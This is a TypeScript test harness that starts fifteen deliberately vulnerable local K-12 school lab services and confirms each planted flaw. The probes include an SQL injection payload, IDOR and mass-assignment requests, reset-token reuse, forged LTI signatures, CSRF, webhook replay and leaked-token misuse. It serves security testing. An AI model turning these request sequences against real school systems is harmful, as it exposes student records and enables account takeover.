#!/usr/bin/env bun

import path from "path"

const repoRoot = path.resolve(import.meta.dir, "../../..")

function fail(proc: ReturnType<typeof Bun.spawn>, message: string): never {
  proc.kill()
  throw new Error(message)
}

async function startTarget(id: string) {
  const service = path.join(repoRoot, "tools", "ulmcode-labs", id, "service", "server.js")
  const proc = Bun.spawn(["bun", service], {
    stdout: "pipe",
    stderr: "pipe",
    env: { ...process.env, PORT: "0" },
  })

  const reader = proc.stdout.getReader()
  const timeout = setTimeout(() => fail(proc, `${id} service did not start`), 5000)
  const readyChunk = await reader.read()
  clearTimeout(timeout)
  const readyText = new TextDecoder().decode(readyChunk.value)
  const ready = JSON.parse(readyText.trim()) as { port?: number }
  if (!ready.port) fail(proc, `${id} service did not report a port`)
  return { proc, base: `http://127.0.0.1:${ready.port}` }
}

async function probeMfaGap() {
  const { proc, base } = await startTarget("k12-login-mfa-gap")
  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
  if (!health.ok || health.lab !== "k12-login-mfa-gap") fail(proc, "health probe failed")

  const policy = await fetch(`${base}/idp/policy`).then((res) => res.json()) as { privilegedMfa?: string }
  if (policy.privilegedMfa !== "optional") fail(proc, "policy probe did not expose weak privileged MFA")

  const login = await fetch(`${base}/login`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ email: "principal@admin.demo-school.test", password: "lab-password", role: "admin" }),
  }).then((res) => res.json()) as { authenticated?: boolean; privileged?: boolean; mfaRequired?: boolean; labFinding?: string }

  if (!login.authenticated || !login.privileged || login.mfaRequired || login.labFinding !== "weak_privileged_mfa") {
    fail(proc, "login probe did not confirm weak privileged MFA")
  }

  proc.kill()
  await proc.exited
  return ["target: k12-login-mfa-gap", "weak_privileged_mfa: confirmed"]
}

async function probeRosterIdor() {
  const { proc, base } = await startTarget("k12-roster-idor")
  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
  if (!health.ok || health.lab !== "k12-roster-idor") fail(proc, "health probe failed")

  const owned = await fetch(`${base}/api/classes`, {
    headers: { "x-teacher-id": "teacher-north" },
  }).then((res) => res.json()) as { classes?: Array<{ id?: string }> }
  if (!owned.classes?.some((item) => item.id === "north-homeroom")) fail(proc, "owned class probe failed")

  const roster = await fetch(`${base}/api/roster?classId=south-algebra`, {
    headers: { "x-teacher-id": "teacher-north" },
  }).then((res) => res.json()) as { authorized?: boolean; students?: unknown[]; labFinding?: string }
  if (!roster.authorized || !roster.students?.length || roster.labFinding !== "cross_tenant_roster_read") {
    fail(proc, "roster probe did not confirm cross-tenant read")
  }

  proc.kill()
  await proc.exited
  return ["target: k12-roster-idor", "cross_tenant_roster_read: confirmed"]
}

async function probeGradebookMassAssignment() {
  const { proc, base } = await startTarget("k12-gradebook-mass-assignment")
  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
  if (!health.ok || health.lab !== "k12-gradebook-mass-assignment") fail(proc, "health probe failed")

  const before = await fetch(`${base}/api/gradebook/student?studentId=student-3001`).then((res) => res.json()) as {
    records?: Array<{ score?: number }>
  }
  if (before.records?.[0]?.score !== 82) fail(proc, "gradebook baseline probe failed")

  const update = await fetch(`${base}/api/gradebook/update`, {
    method: "POST",
    headers: { "content-type": "application/json", "x-user-id": "student-3001" },
    body: JSON.stringify({
      studentId: "student-3001",
      courseId: "math-8",
      role: "teacher",
      teacherId: "teacher-math",
      score: 100,
    }),
  }).then((res) => res.json()) as { authorized?: boolean; grade?: { score?: number }; labFinding?: string }

  if (!update.authorized || update.grade?.score !== 100 || update.labFinding !== "student_grade_mass_assignment") {
    fail(proc, "gradebook probe did not confirm student write escalation")
  }

  proc.kill()
  await proc.exited
  return ["target: k12-gradebook-mass-assignment", "student_grade_mass_assignment: confirmed"]
}

async function probeStorageConfigLeak() {
  const { proc, base } = await startTarget("k12-storage-config-leak")
  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
  if (!health.ok || health.lab !== "k12-storage-config-leak") fail(proc, "health probe failed")

  const config = await fetch(`${base}/api/config/client`).then((res) => res.json()) as {
    bucket?: string
    publicPrefix?: string
    labFinding?: string
  }
  if (
    config.bucket !== "demo-district-student-files" ||
    config.publicPrefix !== "student-support/" ||
    config.labFinding !== "public_storage_config_leak"
  ) {
    fail(proc, "storage config probe did not confirm public config leak")
  }

  const download = await fetch(`${base}/api/storage/download?path=student-support/iep-export.csv`).then((res) =>
    res.json(),
  ) as { authenticated?: boolean; authorized?: boolean; preview?: string; labFinding?: string }
  if (
    download.authenticated ||
    !download.authorized ||
    download.preview !== "student_id,plan_type,accommodation" ||
    download.labFinding !== "unauthenticated_student_file_read"
  ) {
    fail(proc, "storage download probe did not confirm unauthenticated student file read")
  }

  proc.kill()
  await proc.exited
  return ["target: k12-storage-config-leak", "unauthenticated_student_file_read: confirmed"]
}

async function probeStudentSearchInjection() {
  const { proc, base } = await startTarget("k12-student-search-injection")
  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
  if (!health.ok || health.lab !== "k12-student-search-injection") fail(proc, "health probe failed")

  const baseline = await fetch(`${base}/api/students/search?q=North`).then((res) => res.json()) as {
    resultCount?: number
    labFinding?: string
  }
  if (baseline.resultCount !== 1 || baseline.labFinding) fail(proc, "baseline search probe failed")

  const payload = encodeURIComponent("' OR '1'='1")
  const injected = await fetch(`${base}/api/students/search?q=${payload}`).then((res) => res.json()) as {
    resultCount?: number
    labFinding?: string
  }
  if (injected.resultCount !== 3 || injected.labFinding !== "student_search_query_injection") {
    fail(proc, "student search probe did not confirm query injection")
  }

  proc.kill()
  await proc.exited
  return ["target: k12-student-search-injection", "student_search_query_injection: confirmed"]
}

async function probePasswordResetTokenLeak() {
  const { proc, base } = await startTarget("k12-password-reset-token-leak")
  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
  if (!health.ok || health.lab !== "k12-password-reset-token-leak") fail(proc, "health probe failed")

  const request = await fetch(`${base}/api/password-reset/request`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ email: "teacher-reset@district.test" }),
  }).then((res) => res.json()) as { accepted?: boolean; account?: string; labFinding?: string | null }
  if (!request.accepted || request.account !== "teacher-reset@district.test" || request.labFinding) {
    fail(proc, "password reset request probe failed")
  }

  const audit = await fetch(`${base}/api/support/audit-log?account=teacher-reset@district.test`).then((res) =>
    res.json(),
  ) as { authenticated?: boolean; events?: Array<{ resetToken?: string }>; labFinding?: string }
  const token = audit.events?.[0]?.resetToken
  if (audit.authenticated || token !== "reset-lab-token-7142" || audit.labFinding !== "password_reset_token_leak") {
    fail(proc, "audit log probe did not confirm reset token leak")
  }

  const complete = await fetch(`${base}/api/password-reset/complete`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      account: "teacher-reset@district.test",
      token,
      password: "new-synthetic-password",
    }),
  }).then((res) => res.json()) as {
    reset?: boolean
    additionalVerification?: boolean
    labFinding?: string
  }
  if (!complete.reset || complete.additionalVerification || complete.labFinding !== "password_reset_token_reuse") {
    fail(proc, "reset completion probe did not confirm leaked token reuse")
  }

  proc.kill()
  await proc.exited
  return ["target: k12-password-reset-token-leak", "password_reset_token_leak: confirmed"]
}

async function probeGuardianInviteTakeover() {
  const { proc, base } = await startTarget("k12-guardian-invite-takeover")
  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
  if (!health.ok || health.lab !== "k12-guardian-invite-takeover") fail(proc, "health probe failed")

  const invite = await fetch(`${base}/api/guardian/invite?studentId=student-2241`).then((res) =>
    res.json(),
  ) as { authenticated?: boolean; inviteCode?: string; labFinding?: string }
  if (
    invite.authenticated ||
    invite.inviteCode !== "guardian-invite-2241" ||
    invite.labFinding !== "guardian_invite_code_disclosure"
  ) {
    fail(proc, "guardian invite probe did not confirm exposed invite code")
  }

  const link = await fetch(`${base}/api/guardian/accept`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      studentId: "student-2241",
      inviteCode: invite.inviteCode,
      email: "attacker-guardian@example.test",
    }),
  }).then((res) => res.json()) as {
    linked?: boolean
    verifiedBySchool?: boolean
    guardianCount?: number
    labFinding?: string
  }
  if (
    !link.linked ||
    link.verifiedBySchool ||
    link.guardianCount !== 2 ||
    link.labFinding !== "guardian_account_takeover"
  ) {
    fail(proc, "guardian accept probe did not confirm unauthorized account linking")
  }

  proc.kill()
  await proc.exited
  return ["target: k12-guardian-invite-takeover", "guardian_account_takeover: confirmed"]
}

async function probeLtiSharedSecretLeak() {
  const { proc, base } = await startTarget("k12-lti-shared-secret-leak")
  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
  if (!health.ok || health.lab !== "k12-lti-shared-secret-leak") fail(proc, "health probe failed")

  const config = await fetch(`${base}/.well-known/lti-config.json`).then((res) => res.json()) as {
    consumerKey?: string
    sharedSecret?: string
    launchUrl?: string
    labFinding?: string
  }
  if (
    config.consumerKey !== "district-lms" ||
    config.sharedSecret !== "lti-secret-demo-9421" ||
    config.launchUrl !== "/lti/launch" ||
    config.labFinding !== "lti_shared_secret_disclosure"
  ) {
    fail(proc, "LTI config probe did not confirm shared secret disclosure")
  }

  const crypto = await import("node:crypto")
  const launch = {
    consumerKey: config.consumerKey,
    userId: "synthetic-instructor-9001",
    role: "Instructor",
    courseId: "math-8",
  }
  const signedLaunch = await fetch(`${base}/lti/launch`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      ...launch,
      signature: crypto.createHmac("sha256", config.sharedSecret).update(JSON.stringify(launch)).digest("hex"),
    }),
  }).then((res) => res.json()) as {
    launched?: boolean
    role?: string
    gradebookWrite?: boolean
    labFinding?: string
  }
  if (
    !signedLaunch.launched ||
    signedLaunch.role !== "Instructor" ||
    !signedLaunch.gradebookWrite ||
    signedLaunch.labFinding !== "forged_lti_instructor_launch"
  ) {
    fail(proc, "LTI launch probe did not confirm forged instructor launch")
  }

  proc.kill()
  await proc.exited
  return ["target: k12-lti-shared-secret-leak", "forged_lti_instructor_launch: confirmed"]
}

async function probeSisWebhookSignatureBypass() {
  const { proc, base } = await startTarget("k12-sis-webhook-signature-bypass")
  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
  if (!health.ok || health.lab !== "k12-sis-webhook-signature-bypass") fail(proc, "health probe failed")

  const policy = await fetch(`${base}/api/webhooks/sis/policy`).then((res) => res.json()) as {
    signatureMode?: string
    trustedSourceBypass?: string
    labFinding?: string
  }
  if (
    policy.signatureMode !== "warn" ||
    policy.trustedSourceBypass !== "source=trusted-sis" ||
    policy.labFinding !== "sis_webhook_signature_not_enforced"
  ) {
    fail(proc, "SIS webhook policy probe did not confirm weak signature enforcement")
  }

  const rejected = await fetch(`${base}/api/webhooks/sis/events`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      type: "student.guardian.updated",
      studentId: "student-5109",
      guardianEmail: "attacker-guardian@example.test",
    }),
  }).then((res) => res.json()) as { accepted?: boolean; error?: string }
  if (rejected.accepted || rejected.error !== "invalid_signature") {
    fail(proc, "SIS webhook baseline signature rejection probe failed")
  }

  const accepted = await fetch(`${base}/api/webhooks/sis/events?source=trusted-sis`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      type: "student.guardian.updated",
      studentId: "student-5109",
      guardianEmail: "attacker-guardian@example.test",
    }),
  }).then((res) => res.json()) as {
    accepted?: boolean
    signatureVerified?: boolean
    guardianEmail?: string
    labFinding?: string
  }
  if (
    !accepted.accepted ||
    accepted.signatureVerified ||
    accepted.guardianEmail !== "attacker-guardian@example.test" ||
    accepted.labFinding !== "sis_webhook_signature_bypass"
  ) {
    fail(proc, "SIS webhook replay probe did not confirm unsigned event bypass")
  }

  const guardian = await fetch(`${base}/api/students/student-5109/guardian`).then((res) => res.json()) as {
    guardianEmail?: string
    verifiedBySchool?: boolean
    labFinding?: string
  }
  if (
    guardian.guardianEmail !== "attacker-guardian@example.test" ||
    guardian.verifiedBySchool ||
    guardian.labFinding !== "guardian_contact_modified_by_unsigned_webhook"
  ) {
    fail(proc, "SIS guardian record probe did not confirm unsigned webhook state change")
  }

  proc.kill()
  await proc.exited
  return ["target: k12-sis-webhook-signature-bypass", "sis_webhook_signature_bypass: confirmed"]
}

async function probeAssignmentSubmissionImpersonation() {
  const { proc, base } = await startTarget("k12-assignment-submission-impersonation")
  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
  if (!health.ok || health.lab !== "k12-assignment-submission-impersonation") fail(proc, "health probe failed")

  const baseline = await fetch(`${base}/api/assignments/submission?studentId=student-4402&assignmentId=essay-7`).then(
    (res) => res.json(),
  ) as { studentId?: string; text?: string }
  if (baseline.studentId !== "student-4402" || baseline.text !== "Peer draft") {
    fail(proc, "assignment baseline probe failed")
  }

  const submit = await fetch(`${base}/api/assignments/submit`, {
    method: "POST",
    headers: { "content-type": "application/json", "x-student-id": "student-4401" },
    body: JSON.stringify({
      studentId: "student-4402",
      assignmentId: "essay-7",
      text: "forged peer submission",
    }),
  }).then((res) => res.json()) as {
    accepted?: boolean
    submission?: { studentId?: string; submittedBy?: string; ownershipChecked?: boolean }
    labFinding?: string
  }
  if (
    !submit.accepted ||
    submit.submission?.studentId !== "student-4402" ||
    submit.submission?.submittedBy !== "student-4401" ||
    submit.submission?.ownershipChecked ||
    submit.labFinding !== "assignment_submission_impersonation"
  ) {
    fail(proc, "assignment submit probe did not confirm cross-student impersonation")
  }

  const changed = await fetch(`${base}/api/assignments/submission?studentId=student-4402&assignmentId=essay-7`).then(
    (res) => res.json(),
  ) as { text?: string; submittedBy?: string }
  if (changed.text !== "forged peer submission" || changed.submittedBy !== "student-4401") {
    fail(proc, "assignment target state probe did not confirm forged submission")
  }

  proc.kill()
  await proc.exited
  return ["target: k12-assignment-submission-impersonation", "assignment_submission_impersonation: confirmed"]
}

async function probeAttendanceBulkUpdateCsrf() {
  const { proc, base } = await startTarget("k12-attendance-bulk-update-csrf")
  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
  if (!health.ok || health.lab !== "k12-attendance-bulk-update-csrf") fail(proc, "health probe failed")

  const policy = await fetch(`${base}/api/attendance/csrf-policy`).then((res) => res.json()) as {
    csrfRequired?: boolean
    originValidation?: string
    cookieSameSite?: string
    labFinding?: string
  }
  if (
    policy.csrfRequired ||
    policy.originValidation !== "disabled" ||
    policy.cookieSameSite !== "none" ||
    policy.labFinding !== "attendance_csrf_controls_missing"
  ) {
    fail(proc, "attendance CSRF policy probe did not confirm missing protections")
  }

  const update = await fetch(`${base}/api/attendance/bulk-update`, {
    method: "POST",
    headers: {
      "content-type": "application/json",
      origin: "https://evil.example.test",
      cookie: "teacher_session=synthetic-teacher-session",
    },
    body: JSON.stringify({
      updates: [
        { studentId: "student-7101", status: "absent", reason: "forged field trip" },
        { studentId: "student-7102", status: "absent", reason: "forged field trip" },
      ],
    }),
  }).then((res) => res.json()) as {
    accepted?: boolean
    updateCount?: number
    cookieAccepted?: boolean
    csrfVerified?: boolean
    labFinding?: string
  }
  if (
    !update.accepted ||
    update.updateCount !== 2 ||
    !update.cookieAccepted ||
    update.csrfVerified ||
    update.labFinding !== "attendance_bulk_update_csrf"
  ) {
    fail(proc, "attendance update probe did not confirm cross-site state change")
  }

  const records = await fetch(`${base}/api/attendance/records`).then((res) => res.json()) as {
    records?: Array<{ studentId?: string; status?: string; reason?: string }>
  }
  if (!records.records?.every((record) => record.status === "absent" && record.reason === "forged field trip")) {
    fail(proc, "attendance records probe did not confirm mutation")
  }

  proc.kill()
  await proc.exited
  return ["target: k12-attendance-bulk-update-csrf", "attendance_bulk_update_csrf: confirmed"]
}

async function probeTranscriptExportOverexposure() {
  const { proc, base } = await startTarget("k12-transcript-export-overexposure")
  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
  if (!health.ok || health.lab !== "k12-transcript-export-overexposure") fail(proc, "health probe failed")

  const schema = await fetch(`${base}/api/transcripts/export-schema`).then((res) => res.json()) as {
    includeAllAdds?: string[]
    roleRequiredForSensitiveFields?: boolean
    labFinding?: string
  }
  if (
    !schema.includeAllAdds?.includes("disciplineNote") ||
    schema.roleRequiredForSensitiveFields ||
    schema.labFinding !== "transcript_sensitive_field_policy_gap"
  ) {
    fail(proc, "transcript schema probe did not confirm sensitive-field policy gap")
  }

  const exportResult = await fetch(`${base}/api/transcripts/export?studentId=student-8201&include=all`, {
    headers: { "x-role": "teacher" },
  }).then((res) => res.json()) as {
    requesterRole?: string
    export?: { accommodations?: string; disciplineNote?: string; guardianEmail?: string }
    sensitiveFieldsReturned?: boolean
    labFinding?: string
  }
  if (
    exportResult.requesterRole !== "teacher" ||
    exportResult.export?.accommodations !== "extended testing time" ||
    exportResult.export?.disciplineNote !== "synthetic counseling referral" ||
    exportResult.export?.guardianEmail !== "guardian8201@example.test" ||
    !exportResult.sensitiveFieldsReturned ||
    exportResult.labFinding !== "transcript_export_overexposure"
  ) {
    fail(proc, "transcript export probe did not confirm sensitive-field overexposure")
  }

  proc.kill()
  await proc.exited
  return ["target: k12-transcript-export-overexposure", "transcript_export_overexposure: confirmed"]
}

async function probeLmsPaymentWebhookReplay() {
  const { proc, base } = await startTarget("k12-lms-payment-webhook-replay")
  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
  if (!health.ok || health.lab !== "k12-lms-payment-webhook-replay") fail(proc, "health probe failed")

  const policy = await fetch(`${base}/api/payments/webhook-policy`).then((res) => res.json()) as {
    signatureMode?: string
    timestampWindow?: string
    idempotency?: string
    labFinding?: string
  }
  if (
    policy.signatureMode !== "monitor" ||
    policy.timestampWindow !== "disabled" ||
    policy.idempotency !== "disabled" ||
    policy.labFinding !== "payment_webhook_replay_controls_missing"
  ) {
    fail(proc, "payment webhook policy probe did not confirm replay-control gap")
  }

  const first = await fetch(`${base}/api/payments/webhook`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      type: "invoice.paid",
      eventId: "evt-demo-7788",
      studentId: "student-9301",
      amountCents: 12500,
      sentAt: "2026-01-01T00:00:00.000Z",
    }),
  }).then((res) => res.json()) as { accepted?: boolean; replayed?: boolean; balanceCents?: number }
  if (!first.accepted || first.replayed || first.balanceCents !== 0) {
    fail(proc, "payment first webhook probe failed")
  }

  const replay = await fetch(`${base}/api/payments/webhook`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      type: "invoice.paid",
      eventId: "evt-demo-7788",
      studentId: "student-9301",
      amountCents: 12500,
      sentAt: "2026-01-01T00:00:00.000Z",
    }),
  }).then((res) => res.json()) as {
    accepted?: boolean
    signatureVerified?: boolean
    replayed?: boolean
    balanceCents?: number
    labFinding?: string
  }
  if (
    !replay.accepted ||
    replay.signatureVerified ||
    !replay.replayed ||
    replay.balanceCents !== -12500 ||
    replay.labFinding !== "payment_webhook_replay"
  ) {
    fail(proc, "payment replay probe did not confirm stale unsigned replay")
  }

  const balance = await fetch(`${base}/api/payments/student-balance?studentId=student-9301`).then((res) =>
    res.json(),
  ) as { balanceCents?: number; lastEventId?: string; labFinding?: string }
  if (
    balance.balanceCents !== -12500 ||
    balance.lastEventId !== "evt-demo-7788" ||
    balance.labFinding !== "student_fee_balance_modified_by_replayed_webhook"
  ) {
    fail(proc, "payment balance probe did not confirm replayed webhook mutation")
  }

  proc.kill()
  await proc.exited
  return ["target: k12-lms-payment-webhook-replay", "payment_webhook_replay: confirmed"]
}

async function probeFamilyMessagingCrossClassBroadcast() {
  const { proc, base } = await startTarget("k12-family-messaging-cross-class-broadcast")
  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
  if (!health.ok || health.lab !== "k12-family-messaging-cross-class-broadcast") fail(proc, "health probe failed")

  const classes = await fetch(`${base}/api/classes`, {
    headers: { "x-teacher-id": "teacher-north" },
  }).then((res) => res.json()) as { classes?: Array<{ id?: string }> }
  if (!classes.classes?.some((item) => item.id === "north-homeroom")) {
    fail(proc, "messaging class ownership baseline probe failed")
  }

  const policy = await fetch(`${base}/api/messages/policy`).then((res) => res.json()) as {
    teacherOwnershipCheck?: string
    guardianBroadcastAuth?: string
    labFinding?: string
  }
  if (
    policy.teacherOwnershipCheck !== "client_hint" ||
    policy.guardianBroadcastAuth !== "classIdOnly" ||
    policy.labFinding !== "messaging_class_authorization_gap"
  ) {
    fail(proc, "messaging policy probe did not confirm authorization gap")
  }

  const broadcast = await fetch(`${base}/api/messages/broadcast`, {
    method: "POST",
    headers: { "content-type": "application/json", "x-teacher-id": "teacher-north" },
    body: JSON.stringify({ classId: "south-algebra", body: "forged guardian alert" }),
  }).then((res) => res.json()) as {
    accepted?: boolean
    authorizedByOwnership?: boolean
    guardianRecipients?: number
    labFinding?: string
  }
  if (
    !broadcast.accepted ||
    broadcast.authorizedByOwnership ||
    broadcast.guardianRecipients !== 2 ||
    broadcast.labFinding !== "cross_class_family_broadcast"
  ) {
    fail(proc, "messaging broadcast probe did not confirm cross-class send")
  }

  const outbox = await fetch(`${base}/api/messages/outbox?classId=south-algebra`).then((res) =>
    res.json(),
  ) as { messages?: Array<{ sentBy?: string; body?: string }>; labFinding?: string }
  if (
    outbox.messages?.[0]?.sentBy !== "teacher-north" ||
    outbox.messages?.[0]?.body !== "forged guardian alert" ||
    outbox.labFinding !== "guardian_message_delivered_cross_class"
  ) {
    fail(proc, "messaging outbox probe did not confirm cross-class delivery")
  }

  proc.kill()
  await proc.exited
  return ["target: k12-family-messaging-cross-class-broadcast", "cross_class_family_broadcast: confirmed"]
}

async function probeThirdPartyIntegrationTokenLeak() {
  const { proc, base } = await startTarget("k12-third-party-integration-token-leak")
  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
  if (!health.ok || health.lab !== "k12-third-party-integration-token-leak") fail(proc, "health probe failed")

  const config = await fetch(`${base}/api/integrations/vendor/config`).then((res) => res.json()) as {
    oauthAccessToken?: string
    scopes?: string[]
    labFinding?: string
  }
  if (
    config.oauthAccessToken !== "vendor-token-demo-5521" ||
    !config.scopes?.includes("roster:sync") ||
    config.labFinding !== "third_party_oauth_token_exposure"
  ) {
    fail(proc, "integration config probe did not confirm token exposure")
  }

  const preview = await fetch(`${base}/api/integrations/vendor/roster-preview`, {
    headers: { authorization: `Bearer ${config.oauthAccessToken}` },
  }).then((res) => res.json()) as {
    authorized?: boolean
    studentCount?: number
    sensitiveFieldsReturned?: boolean
    labFinding?: string
  }
  if (
    !preview.authorized ||
    preview.studentCount !== 2 ||
    !preview.sensitiveFieldsReturned ||
    preview.labFinding !== "vendor_token_roster_preview_access"
  ) {
    fail(proc, "integration preview probe did not confirm leaked-token access")
  }

  const sync = await fetch(`${base}/api/integrations/vendor/sync`, {
    method: "POST",
    headers: { authorization: `Bearer ${config.oauthAccessToken}` },
  }).then((res) => res.json()) as {
    synced?: boolean
    importedRecords?: number
    sensitiveFieldsImported?: boolean
    labFinding?: string
  }
  if (
    !sync.synced ||
    sync.importedRecords !== 2 ||
    !sync.sensitiveFieldsImported ||
    sync.labFinding !== "vendor_token_roster_sync"
  ) {
    fail(proc, "integration sync probe did not confirm leaked-token sync")
  }

  proc.kill()
  await proc.exited
  return ["target: k12-third-party-integration-token-leak", "third_party_oauth_token_exposure: confirmed"]
}

const lines = [
  "ulm_lab_target: ok",
  ...(await probeMfaGap()),
  ...(await probeRosterIdor()),
  ...(await probeGradebookMassAssignment()),
  ...(await probeStorageConfigLeak()),
  ...(await probeStudentSearchInjection()),
  ...(await probePasswordResetTokenLeak()),
  ...(await probeGuardianInviteTakeover()),
  ...(await probeLtiSharedSecretLeak()),
  ...(await probeSisWebhookSignatureBypass()),
  ...(await probeAssignmentSubmissionImpersonation()),
  ...(await probeAttendanceBulkUpdateCsrf()),
  ...(await probeTranscriptExportOverexposure()),
  ...(await probeLmsPaymentWebhookReplay()),
  ...(await probeFamilyMessagingCrossClassBroadcast()),
  ...(await probeThirdPartyIntegrationTokenLeak()),
]

console.log(lines.join("\n"))
